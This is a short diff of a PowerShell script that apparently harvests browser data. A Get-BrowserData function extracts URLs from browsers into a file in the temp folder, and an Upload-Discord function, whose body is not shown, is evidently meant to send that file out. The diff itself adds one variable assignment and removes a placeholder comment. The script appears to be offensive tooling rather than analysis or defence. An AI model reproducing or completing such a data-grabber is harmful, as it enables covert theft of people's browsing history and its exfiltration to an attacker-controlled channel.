@@ -9,6 +9,7 @@ function Get-BrowserData {
     )
 
     $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+    $Search = $Regex
 
     switch ($Browser.ToLower()) {
         'chrome' {
@@ -59,8 +60,6 @@ foreach ($browser in $browsers) {
         Get-BrowserData -Browser $browser -DataType $dataType >> $env:TMP\--BrowserData.txt
     }
 }
-
-# ... Rest of the code (Upload-Discord function and execution)
 
 function Upload-Discord {
 
